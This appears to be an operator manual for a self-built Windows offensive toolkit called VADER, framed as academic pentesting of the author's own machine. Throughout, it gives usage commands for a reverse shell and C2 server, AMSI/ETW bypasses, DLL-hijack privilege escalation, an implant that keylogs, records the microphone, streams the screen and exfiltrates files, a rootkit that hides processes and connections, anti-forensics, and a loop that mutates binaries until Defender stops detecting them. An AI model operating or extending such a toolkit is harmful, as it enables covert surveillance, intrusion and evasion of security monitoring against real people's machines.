# VADER — OPERATOR MANUAL

```
CLASSIFICATION:  UNCLASSIFIED // ACADEMIC USE ONLY
OPERATOR:        VADER (george wu / 22DIV)
REVISION:        1.0 — 2026-06-21
HARDWARE:        Own systems only. Standard user privileges unless noted.
```

---

## Table of Contents

1. [Quick Start](#1-quick-start)
2. [Architecture Overview](#2-architecture-overview)
3. [Port Map](#3-port-map)
4. [vader_menu.py — Terminal Dashboard](#4-vader_menupy--terminal-dashboard)
5. [vader_ui.py — Web Dashboard + Agent Listener](#5-vader_uipy--web-dashboard--agent-listener)
6. [vader_agent.py — Remote Agent](#6-vader_agentpy--remote-agent)
7. [deploy.py — Deployment Orchestrator](#7-deploypy--deployment-orchestrator)
8. [Mutation Pipeline](#8-mutation-pipeline)
9. [Cloak Subsystem](#9-cloak-subsystem)
10. [Shell / C2 Subsystem](#10-shell--c2-subsystem)
11. [Stager Subsystem](#11-stager-subsystem)
12. [Reconnaissance](#12-reconnaissance)
13. [Privilege Escalation Hunters](#13-privilege-escalation-hunters)
14. [BYOVD Subsystem](#14-byovd-subsystem)
15. [Reporting](#15-reporting)
16. [Testing & Scanning](#16-testing--scanning)
17. [VADER-PRIME Exploits](#17-vader-prime-exploits)
18. [Radon Engagement Checklist](#18-radon-engagement-checklist)
19. [Troubleshooting](#19-troubleshooting)

---

## 1. Quick Start

### First Time Setup

```
# Prerequisites
# - MSVC Build Tools (vcvars64.bat on PATH)
# - Windows Defender active (MpCmdRun.exe)
# - Python 3.x

cd C:\Users\gwu07\Desktop\vader-rootkit

# 1. Compile everything
python deploy.py --compile

# 2. Scan everything against Defender
python deploy.py --scan

# 3. Launch terminal dashboard
python vader_menu.py
```

### Daily Workflow

```
# Terminal dashboard (recommended entry point)
python vader_menu.py

# Or web dashboard
python vader_ui.py
# Opens http://127.0.0.1:8666 automatically
```

### Full Pentest (One Command)

```
python deploy.py --pentest --profile radon
```

---

## 2. Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    OPERATOR INTERFACES                       │
│  vader_menu.py (terminal)    vader_ui.py (web :8666)        │
└──────────────┬───────────────────────┬──────────────────────┘
               │                       │
    ┌──────────▼──────────┐  ┌────────▼─────────┐
    │   deploy.py         │  │  Agent Listener   │
    │   (orchestrator)    │  │  TCP :8667        │
    └──────────┬──────────┘  └────────┬──────────┘
               │                      │
    ┌──────────▼──────────────────────▼──────────┐
    │              KILL CHAIN PHASES              │
    │                                             │
    │  P0: SHELL      (ALPHA)    → shell/         │
    │  P1: AMSI       (DELTA)    → amsi/          │
    │  P2: ETW        (FOXTROT)  → etw/           │
    │  P1+2: DARK ROOM (CHARLIE) → dark_room/     │
    │  P3: PRIVESC    (V4-V7)    → sideload/      │
    │  P4: INJECTION  (HOTEL)    → injection/      │
    │  P5: STAGER     (INDIA)    → stagers/        │
    │  P6: FORENSICS  (JULIET)   → forensics/      │
    │  P7: CLOAK      (KILO)     → cloak/          │
    └─────────────────────────────────────────────┘
               │
    ┌──────────▼──────────────────────────────────┐
    │              META TOOLS                      │
    │  mutate.py      XOR key rotation             │
    │  metamorph.py   Source-level transforms       │
    │  vader_evolve.py  Full evolution pipeline     │
    │  scan_all.py    Detection verification        │
    └──────────────────────────────────────────────┘
```

### Kill Chain Phases

| Phase | Codename | Binary | Directory | Purpose |
|-------|----------|--------|-----------|---------|
| 0 | ALPHA | vader_shell.exe | shell/ | XOR-encrypted reverse shell callback |
| 1 | DELTA | amsi_hwbp.exe | amsi/ | HWBP on DR0 → AmsiScanBuffer blind |
| 2 | FOXTROT | etw_hwbp.exe | etw/ | HWBP on DR1 → EtwEventWrite blind |
| 1+2 | CHARLIE | dark_room.exe | dark_room/ | Combined AMSI+ETW bypass |
| 3 | V4/V6/V7 | svc_replace.exe et al. | sideload/ | User→SYSTEM via DLL sideload CVEs |
| 4 | HOTEL | vader_inject.exe + .dll | injection/ | Process injection with HWBP propagation |
| 5 | INDIA | vader_stager.exe | stagers/ | HTTP download cradle |
| 6 | JULIET | vader_clean.exe | forensics/ | Anti-forensics: log clear, timestomp, self-delete |
| 7 | KILO | cloak.dll + loader | cloak/ | Process/file/connection concealment |
| M | MUTATE | mutate.py | ./ | XOR key rotation + recompile |

---

## 3. Port Map

| Port | Protocol | Service | Tool |
|------|----------|---------|------|
| 4444 | TCP | C2 reverse shell | vader_c2.py, vader_listener.py |
| 8080 | HTTP | Payload stager | vader_serve.py |
| 8666 | HTTP | Web dashboard | vader_ui.py |
| 8667 | TCP | Agent listener | vader_ui.py → vader_agent.py |
| 53683 | TCP | Dropper callback | c2_listen.py |

---

## 4. vader_menu.py — Terminal Dashboard

**The primary entry point.** Interactive terminal UI with kill chain status, arsenal status, and one-key operations.

```
python vader_menu.py
```

### Operations

| Key | Operation | What It Runs |
|-----|-----------|--------------|
| 1 | Compile All | `deploy.py --compile` |
| 2 | Scan All | `deploy.py --scan` |
| 3 | Dark Room Test | `dark_room.exe --test` |
| 4 | Mutate All | `mutate.py` (all targets) |
| 5 | Deploy | `deploy.py --deploy` |
| 6 | Key Status | `mutate.py --status` |
| 7 | Build Cloak | `build_cloak.py --scan` |
| 8 | Test Cloak | `cloak/bin/test_hook.exe` |
| 9 | Activate Cloak | `cloak/bin/cloak_loader.exe` (system-wide, requires admin) |
| W | Web Dashboard | Launches `vader_ui.py`, opens browser to :8666 |
| A | Agent (local) | `vader_agent.py 127.0.0.1 --reconnect` |
| 0 | Exit | Quit |

### Status Display

The menu shows real-time status for:
- **Kill Chain** — each phase shows READY/MISSING based on binary existence
- **Arsenal** — supplementary tools (Dark Room, Injector DLL, Cloak, Dropper, Recon, Deploy)
- **XOR Keys** — current key values per component

---

## 5. vader_ui.py — Web Dashboard + Agent Listener

**Browser-based C2 dashboard** with real-time console, agent management, and operation buttons.

```
python vader_ui.py
# Dashboard: http://127.0.0.1:8666
# Agent listener: TCP :8667
```

### Dashboard Buttons

| Button | Endpoint | Description |
|--------|----------|-------------|
| COMPILE | POST /api/run/compile | Compile all components |
| SCAN | POST /api/run/scan | Defender scan all binaries |
| DARK ROOM | POST /api/run/darkroom | AMSI+ETW bypass test |
| MUTATE | POST /api/run/mutate | XOR key rotation + recompile |
| BUILD CLOAK | POST /api/run/cloak | Build cloak subsystem |
| KEYGEN | POST /api/run/keygen | Generate new XOR keys |
| RECON | POST /api/run/recon | Run reconnaissance scanner |
| KEY STATUS | POST /api/run/keystatus | Display current XOR keys |
| FULL PENTEST | POST /api/run/pentest | Complete automated pentest |
| CANCEL | POST /api/cancel | Kill running operation + clear lock |
| CLEAR | POST /api/clear | Clear console output |

### Console

Real-time output from all operations. The console header shows:
- **OPERATIONAL** (green) — ready for commands
- **RUNNING** (amber) — operation in progress, CANCEL button appears
- Operation name displayed next to status

### Agent Panel

Connected agents appear in a dedicated panel. Each agent shows:
- Agent ID, hostname, IP, OS
- Available operations (see Section 6)

### Operation Lock

Only one operation runs at a time. If an operation hangs:
1. Click **CANCEL** in the console header
2. This kills the subprocess and clears the lock
3. Operations auto-timeout after 300 seconds

### API Reference

**GET Endpoints:**

| Endpoint | Returns |
|----------|---------|
| `/` | Dashboard HTML |
| `/api/status` | `{op_running, op_name, kill_chain, tools, keys, defender, hostname}` |
| `/api/console` | `{lines: [...]}` |
| `/api/agents` | `[{id, hostname, ip, os, ...}]` |

**POST Endpoints:**

| Endpoint | Action |
|----------|--------|
| `/api/run/<operation>` | Trigger operation (see buttons table) |
| `/api/cancel` | Kill running op + clear lock |
| `/api/clear` | Clear console buffer |
| `/api/agents/<id>/task` | Send task to agent (JSON body) |
| `/api/agents/<id>/kill` | Disconnect agent |

---

## 6. vader_agent.py — Remote Agent

**Client-side implant** that connects back to the C2 operator, receives tasks, executes locally.

```
python vader_agent.py <operator_ip> [port] [--reconnect]
```

| Argument | Description | Default |
|----------|-------------|---------|
| `operator_ip` | C2 server IP | Required |
| `port` | Agent listener port | 8667 |
| `--reconnect` | Auto-reconnect on disconnect | Off |

### Agent Operations

Sent from the web dashboard via `/api/agents/<id>/task`:

| Operation | Parameters | Description |
|-----------|------------|-------------|
| sysinfo | — | Hostname, OS, user, IP, privileges |
| exec | cmd | Execute shell command |
| recon | — | Full reconnaissance scan |
| scan | path | Scan file at path |
| ls | path (default ".") | List directory |
| download | path | Send file to C2 |
| upload | path, size | Receive file from C2 |
| screenshot | — | Capture screen, send back |
| mic | duration (default 10) | Record microphone N seconds |
| keylog | duration (default 30) | Capture keystrokes N seconds |
| sftp_get | path, chunk_size | Chunked file download |
| sftp_put | path, size, sha256_expect | File upload with integrity check |
| sftp_sync | path, recursive | Recursive directory sync |
| persist | method (default "schtask") | Install persistence: schtask, registry, wmi, ifeo |
| vnc | duration (default 60), fps (default 2) | Stream screen at N fps |
| ping | — | Heartbeat |
| exit | — | Terminate agent |

### Protocol

Length-prefixed JSON over TCP. Each message:
```
[4 bytes: length (big-endian)] [JSON payload]
```

---

## 7. deploy.py — Deployment Orchestrator

**Automates the full deployment chain**: recon → compile → scan → deploy → listen.

```
python deploy.py [flags]
```

### Flags

| Flag | Description |
|------|-------------|
| `--recon` | Run vader_recon.ps1 |
| `--compile` | Compile all components via MSVC |
| `--compile-shell IP PORT` | Compile reverse shell with specific callback |
| `--scan` | Defender scan all binaries |
| `--deploy V4\|V6\|V7` | Deploy a privilege escalation vector |
| `--chain V4\|V6\|V7` | Full chain: compile + scan + deploy + listen |
| `--status` | Show deployment status |
| `--listen [port]` | Start C2 listener (default: 4444) |
| `--port PORT` | Override listener port |
| `--pentest` | Run full automated pentest sequence |
| `--profile local\|radon` | Target profile |
| `--dry-run` | Preview without executing |
| `--skip-compile` | Skip compilation in chain |
| `--skip-recon` | Skip recon in pentest |
| `--canary V4\|V6\|V7` | Wait for canary file (SYSTEM execution proof) |
| `--canary-timeout N` | Seconds to wait (default: 300) |
| `--cleanup [ALL\|vector]` | Remove deployed payloads |

### Privilege Escalation Vectors

| ID | Codename | Technique | CWE |
|----|----------|-----------|-----|
| V4 | DELTA | Service binary replacement | CWE-732 |
| V6 | FOXTROT | PATH DLL hijack | CWE-426 |
| V7 | GOLF | Phantom DLL loading | CWE-427 |

### Target Profiles

| Profile | Description |
|---------|-------------|
| local | Development machine |
| radon | RADON laptop (192.168.1.145, standard user, Defender active) |

### Common Workflows

```
# Compile and scan everything
python deploy.py --compile --scan

# Full automated chain for V7
python deploy.py --chain V7 --profile radon

# Check deployment status
python deploy.py --status

# Clean up after engagement
python deploy.py --cleanup ALL
```

---

## 8. Mutation Pipeline

Three tools, increasing scope. Use the right one for the job.

### mutate.py — XOR Key Rotation

Rotates XOR encryption keys in C source, recompiles, verifies Defender evasion.

```
python mutate.py [flags]
```

| Flag | Description |
|------|-------------|
| `--target TARGET` | Single component (default: all) |
| `--dry-run` | Preview without changes |
| `--status` | Show current XOR keys |

**Targets:** `dark_room`, `inject_dll`, `inject_exe`, `v4_svc_replace`, `v5_dll_proxy`, `v6_path_hijack`, `v7_phantom_dll`, `shell`

### metamorph.py — Source-Level Transforms

Structural source-to-source C code transforms. Each run produces a structurally unique binary.

```
python metamorph.py [flags]
```

| Flag | Description |
|------|-------------|
| `--target TARGET` | Single component (default: all) |
| `--intensity low\|med\|high` | Transform density (default: med) |
| `--dry-run` | Preview without changes |
| `--restore` | Revert to pre-metamorph backup |
| `--seed N` | Random seed for reproducibility |

**Targets:** `dark_room`, `inject_dll`, `inject_exe`, `shell`, `v4_svc_replace`, `v5_dll_proxy`, `v6_path_hijack`, `v7_phantom_dll`, `stager`, `forensics`, `cloak`, `dropper`

**Intensity Levels:**

| Level | Dead Blocks | Junk Vars | Opaque Predicates | Const Split | Junk APIs |
|-------|------------|-----------|-------------------|-------------|-----------|
| low | 2 | 3 | 15% | 20% | 2 |
| med | 5 | 6 | 30% | 40% | 4 |
| high | 10 | 12 | 50% | 60% | 8 |

**8 Transform Types:**
1. Dead code injection
2. Junk variable insertion
3. Opaque predicates (always-true/false conditionals)
4. Constant splitting (breaking constants into arithmetic)
5. Identifier mutation (rename variables/functions)
6. Function reordering
7. String encryption upgrade
8. Junk API calls (harmless WinAPI noise)

### vader_evolve.py — Full Evolution Pipeline

Chains metamorph → mutate → compile → scan → fingerprint in one pipeline.

```
python vader_evolve.py [flags]
```

| Flag | Description |
|------|-------------|
| `--target TARGET` | Single component (default: all) |
| `--intensity low\|med\|high` | Metamorphic density (default: med) |
| `--cycles N` | Evolution cycles (default: 1) |
| `--dry-run` | Preview without changes |
| `--scan-only` | Just scan existing binaries |
| `--fingerprint` | Just SHA256 fingerprint existing binaries |

**Pipeline Per Cycle:**
1. METAMORPH — structural source transforms
2. MUTATE — XOR key rotation + recompile
3. SCAN — Defender verification (15 tracked binaries)
4. FINGERPRINT — SHA256 + size for change tracking

---

## 9. Cloak Subsystem

User-mode concealment via inline hooks on NT functions. Hides processes, files, and network connections from Task Manager, dir, netstat.

### build_cloak.py — Build

```
python cloak/build_cloak.py [--scan]
```

Compiles three binaries into `cloak/bin/`:
- **cloak.dll** — hook engine + hide_process + hide_file + hide_connection
- **cloak_loader.exe** — SetWindowsHookEx system-wide installer (requires admin)
- **vader_dropper.exe** — single-click full kill chain deployment

### gen_payload.py — Payload Embedding

```
python cloak/gen_payload.py
```

Converts cloak.dll → rolling XOR encrypted C byte array → `cloak_payload.h` for dropper embedding.

### test_cloak.py — Verification

```
python cloak/test_cloak.py              # Pre-cloak baseline (items visible)
python cloak/test_cloak.py --after      # Post-cloak check (items should be hidden)
```

Checks:
- **Processes:** vader_shell.exe, dark_room.exe, vader_implant.exe, vader_inject.exe, vader_stager.exe, cloak_loader.exe
- **Files:** 12 targets in cloak/bin/
- **Connections:** port 4444

### c2_listen.py — Dropper Callback

```
python cloak/c2_listen.py [port] [bind]
# Default: 0.0.0.0:53683
```

Listens for dropper callback: `hostname|cloak_status|shell_port`

### Activation Sequence

```
# 1. Build
python cloak/build_cloak.py --scan

# 2. Test hook mechanism
cloak\bin\test_hook.exe

# 3. Verify baseline (items visible)
python cloak/test_cloak.py

# 4. Activate system-wide (requires admin)
cloak\bin\cloak_loader.exe

# 5. Verify concealment (items hidden)
python cloak/test_cloak.py --after

# 6. Press ENTER in loader window to deactivate
```

---

## 10. Shell / C2 Subsystem

### vader_c2.py — Multi-Client C2 Listener

```
python shell/vader_c2.py [port] [--bind IP]
# Default: 0.0.0.0:4444
```

**Console Commands:**

| Command | Description |
|---------|-------------|
| `sessions` / `ls` | List active sessions |
| `interact <id>` / `use <id>` | Interact with session |
| `kill <id>` | Kill session |
| `back` | Return to main console |
| `log` | Show session log path |
| `help` | Available commands |
| `exit` / `quit` | Shutdown C2 |

**Logs:** `reporting/c2_logs/c2_log_{timestamp}.jsonl`

### vader_listener.py — Single-Session Listener + Config Generator

```
python shell/vader_listener.py [port] [--gen]
# Default: 0.0.0.0:4444
# --gen: Generate XOR config for shell payload (key: 0x41)
```

Auto-detects local IP, interactive selection for multi-NIC.

### test_listener.py — Automated C2 Test

```
python shell/test_listener.py
# Catches callback on :4444, runs 5 commands, exits (30s timeout)
# Auto-runs: whoami, hostname, C:, cd \, dir
```

---

## 11. Stager Subsystem

### vader_serve.py — HTTP Payload Server

```
python stagers/vader_serve.py [port]
# Default: :8080
```

**GET Endpoints (payload delivery):**

| Endpoint | Payload |
|----------|---------|
| `/dark_room` | dark_room.exe |
| `/inject_dll` | vader_inject.dll |
| `/inject_exe` | vader_inject.exe |
| `/shell` | vader_shell.exe |
| `/persist` | Persistence payload |

**POST Endpoint:**

| Endpoint | Description |
|----------|-------------|
| `/recon` | Receives uploaded recon data from target |

HEAD supported on all GET endpoints for existence checks.

### gen_implant_xor.py — String Encoder

```
python stagers/gen_implant_xor.py [key_hex] [--ip IP]
# Default key: 0x5E
```

Generates XOR-encoded C arrays for vader_implant.c. Encodes 14 hardcoded strings.

---

## 12. Reconnaissance

### vader_recon.ps1 — 20-Section Host Scanner

```
powershell -ExecutionPolicy Bypass -File recon/vader_recon.ps1
```

Runs as standard user. No elevation required.

**Output:** `RECON_{hostname}_{timestamp}.log`

**20 Sections:**

| # | Section | What It Finds |
|---|---------|---------------|
| 1 | System Identity | Hostname, OS build, architecture |
| 2 | User/Privilege | Current user, groups, token privileges |
| 3 | UAC/Security | UAC level, ConsentPromptBehavior |
| 4 | Defender/AV | RTP status, signatures, exclusions |
| 5 | VBS/HVCI/Secure Boot | Virtualization-based security |
| 6 | Network State | Interfaces, DNS, routes, connections |
| 7 | Service Privesc Hunt | SYSTEM services with writable paths |
| 8 | Service Binary ACLs | File permissions on service executables |
| 9 | Scheduled Tasks | Tasks running as SYSTEM/Highest |
| 10 | PATH Analysis | User-writable directories in PATH |
| 11 | KnownDLLs | Registry enumeration of protected DLLs |
| 12 | Installed Software | Applications inventory |
| 13 | Running Processes | Process list with parent PIDs |
| 14 | Autorun/Persistence | Registry run keys, startup items |
| 15 | Writable ProgramData | Writable subdirectories |
| 16 | Interesting Files | Config files, credentials, sensitive data |
| 17 | Shares/Remote Access | Network shares, RDP, WinRM |
| 18 | Privesc Quick Checks | AlwaysInstallElevated, AppInit_DLLs, IFEO, Print Monitors, LSA, WMI subs, Token Privileges, Named Pipes |
| 19 | Phantom DLL Hunting | PE import analysis for non-KnownDLL imports |
| 20 | VADER Vector Assessment | Scores V4/V6/V7/Dark Room exploitability |

---

## 13. Privilege Escalation Hunters

### hunter.ps1 — 8-Phase DLL Sideload Scanner

```
powershell -ExecutionPolicy Bypass -File sideload/hunter.ps1 [-Full] [-PathOnly] [-Quiet]
```

| Flag | Description |
|------|-------------|
| `-Full` | All phases including slow PE import analysis |
| `-PathOnly` | Only check PATH variable |
| `-Quiet` | Minimal output |

**8 Phases:**

| Phase | Description |
|-------|-------------|
| 1 | PATH writable directories |
| 2 | SYSTEM services with writable exe directories |
| 3 | KnownDLLs protection enumeration |
| 4 | Writable ProgramData subdirectories |
| 5 | SYSTEM scheduled tasks with writable paths |
| 6 | Unquoted service paths |
| 7 | DLL import analysis (requires `-Full`, uses dumpbin) |
| 8 | Missing DLL search order probe (28 candidates) |

**Output:** `sideload/hunt_results.txt`

### hunter_v2.ps1 — Advanced Scanner

```
powershell -ExecutionPolicy Bypass -File sideload/hunter_v2.ps1
```

4 phases: SYSTEM services + manifest parsing + PE import analysis + COM hijack candidates + SYSTEM PATH.

**Output:** `sideload/hunt_v2_results.txt`

### deploy.bat — Sideload Deployment

```
sideload\deploy.bat              # Plant DLL (standard user)
sideload\deploy.bat restart      # Plant + restart service (admin)
sideload\deploy.bat check        # Check for canary (SYSTEM proof)
sideload\deploy.bat clean        # Remove planted DLL + canary
```

---

## 14. BYOVD Subsystem

Bring-Your-Own-Vulnerable-Driver for kernel-level operations.

### build_byovd.py

```
python byovd/build_byovd.py [--scan|--noscan]
```

Builds into `byovd/bin/`:
- **byovd.exe** — BYOVD loader (RTCore64.sys CVE-2019-16098)
- **vader_persist.exe** — Kernel-level persistence via EPROCESS DKOM

---

## 15. Reporting

### pentest_report.py — PTES-Format Report Generator

```
# Start engagement
python reporting/pentest_report.py --init --profile radon

# Log actions during engagement
python reporting/pentest_report.py --log "Ran recon scan" --phase recon --tool vader_recon.ps1
python reporting/pentest_report.py --log "Deployed V7 phantom DLL" --phase privilege-escalation --ai
python reporting/pentest_report.py --log "Captured screenshot via VNC" --phase post-exploit --evidence ss.png

# Generate final report
python reporting/pentest_report.py --report --format md

# List all sessions
python reporting/pentest_report.py --list
```

**Phases:** `recon`, `initial-access`, `execution`, `defense-evasion`, `persistence`, `privilege-escalation`, `c2`, `post-exploit`, `cleanup`, `general`

**MITRE ATT&CK Coverage:** TA0043, TA0001, TA0002, TA0003, TA0004, TA0005, TA0011, TA0009

**Session Data:** `reporting/sessions/<session_id>/`

---

## 16. Testing & Scanning

### scan_all.py — Full Detection Scan

```
python tests/scan_all.py
```

Copies all compiled binaries to temp, scans with Defender, reports CLEAN/DETECTED.

### test_cloak.py — Concealment Verification

See [Section 9](#9-cloak-subsystem).

### test_listener.py — C2 Callback Test

See [Section 10](#10-shell--c2-subsystem).

---

## 17. VADER-PRIME Exploits

### VaderPrime.exe

```
exploits\vader-prime\build.bat

# Modes
VaderPrime.exe --validate        # Test cldflt primitive
VaderPrime.exe --printproc       # Print Processor chain exploit
VaderPrime.exe --ifeo [exe]      # IFEO debugger hijack
```

### find_blockedapps.py — Ghidra Script

Reverse engineering script for cldflt.sys analysis. Load in Ghidra Script Manager.

---

## 18. Radon Engagement Checklist

Standard user privileges. Defender active. 192.168.1.145.

### Pre-Engagement

```
[ ] Verify network connectivity to Radon machine
[ ] Run recon: python deploy.py --recon --profile radon
[ ] Review recon output for exploitable vectors
[ ] Compile all: python deploy.py --compile
[ ] Scan all: python deploy.py --scan — confirm 0 detections
[ ] Mutate if any detected: python mutate.py
[ ] Generate shell config: python shell/vader_listener.py --gen
[ ] Set callback IP in shell source to operator IP
[ ] Recompile shell: python deploy.py --compile-shell <YOUR_IP> 4444
```

### Engagement Sequence

```
# 1. Start reporting
python reporting/pentest_report.py --init --profile radon

# 2. Reconnaissance
python deploy.py --recon --profile radon
python reporting/pentest_report.py --log "Host recon complete" --phase recon

# 3. Start C2 listener
python shell/vader_c2.py 4444

# 4. Start payload server (separate terminal)
python stagers/vader_serve.py 8080

# 5. Deploy privesc vector
python deploy.py --deploy V7 --profile radon

# 6. Wait for canary (SYSTEM execution proof)
python deploy.py --canary V7 --canary-timeout 300

# 7. Start web dashboard (separate terminal)
python vader_ui.py

# 8. Connect agent on target
python vader_agent.py <OPERATOR_IP> --reconnect

# 9. Post-exploitation via web dashboard
#    - SYSINFO, SCREENSHOT, KEYLOG, MIC REC, VNC STREAM
#    - SFTP GET/PUT for file exfiltration

# 10. Activate concealment
cloak\bin\cloak_loader.exe

# 11. Verify concealment
python cloak/test_cloak.py --after

# 12. Cleanup
python deploy.py --cleanup ALL
python reporting/pentest_report.py --log "Engagement cleanup" --phase cleanup
```

### Post-Engagement

```
[ ] Generate report: python reporting/pentest_report.py --report
[ ] Verify cleanup: python deploy.py --status
[ ] Archive session data from reporting/sessions/
[ ] Push engagement evidence to private repo
```

---

## 19. Troubleshooting

### Web Dashboard Buttons Don't Work

**Symptom:** Clicking operation buttons does nothing. Status stays "OPERATIONAL" but nothing happens.

**Cause:** Previous operation's lock is stuck (subprocess hung or browser closed during operation).

**Fix:** Click the **CANCEL** button in the console header. If CANCEL isn't visible, the lock may need manual clearing — restart vader_ui.py.

### Compilation Fails

**Symptom:** `deploy.py --compile` errors out.

**Fix:** Ensure MSVC vcvars64.bat is on PATH. Run from VS Developer Command Prompt or set up environment:
```
"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
```

### Defender Detects a Binary

**Symptom:** `scan_all.py` reports DETECTED for a component.

**Fix:**
```
# Rotate just that component's key
python mutate.py --target <component>

# Or evolve the entire arsenal
python vader_evolve.py --intensity high
```

### Agent Won't Connect

**Symptom:** vader_agent.py can't reach the C2.

**Fix:**
1. Verify vader_ui.py is running (agent listener on :8667)
2. Check firewall: `netsh advfirewall firewall add rule name="VADER Agent" dir=in action=allow protocol=TCP localport=8667`
3. Verify correct IP: agent must connect to operator's LAN IP, not 127.0.0.1 (unless local)

### Cloak Loader Doesn't Hide Processes

**Symptom:** `test_cloak.py --after` still shows processes.

**Fix:**
1. Cloak loader requires **admin** privileges for system-wide hooks
2. Console processes (cmd.exe, powershell.exe) may need WH_SHELL instead of WH_CBT
3. 32-bit processes won't be cloaked by a 64-bit DLL

### Operation Timed Out

**Symptom:** Console shows "Timed out after 300s — killed"

**Cause:** Operation subprocess took longer than 5 minutes.

**Fix:** This is a safety mechanism. Investigate why the operation hung. Common causes:
- Network timeout during recon
- Defender scan taking too long on large binary set
- Compile error causing infinite loop in build script

---

## Appendix A: Global Prerequisites

| Dependency | Required By |
|------------|-------------|
| Python 3.x | All Python tools |
| MSVC (vcvars64.bat) | deploy.py, mutate.py, build_cloak.py, build_byovd.py |
| MpCmdRun.exe | deploy.py, mutate.py, scan_all.py, vader_evolve.py |
| PowerShell | vader_recon.ps1, hunter.ps1, hunter_v2.ps1 |
| paramiko | deploy_evc.py (website deployment only) |
| pyautogui | vader_agent.py (screenshot) |
| pyaudio | vader_agent.py (mic recording) |
| pynput | vader_agent.py (keylogging) |

## Appendix B: Tracked Binaries (15)

| Binary | Component |
|--------|-----------|
| dark_room.exe | AMSI+ETW bypass |
| vader_shell.exe | Reverse shell |
| vader_inject.dll | Injection payload DLL |
| vader_inject.exe | Injector |
| WsNativePushService.exe | V4 service replace |
| VERSION.dll | V5 DLL proxy |
| targetname.dll | V6 PATH hijack |
| osppc.dll | V7 phantom DLL |
| http_stager.exe | HTTP download cradle |
| vader_clean.exe | Anti-forensics |
| cloak.dll | Concealment hooks |
| cloak_loader.exe | System-wide hook installer |
| vader_dropper.exe | Full kill chain dropper |
| byovd.exe | BYOVD loader |
| vader_persist.exe | Kernel persistence |

---

*The weapon knows itself. The operator reads the manual once — then the manual reads the battlefield.*
*Every flag a SWITCH. Every port a doorway. Every phase a step closer to SYSTEM.*
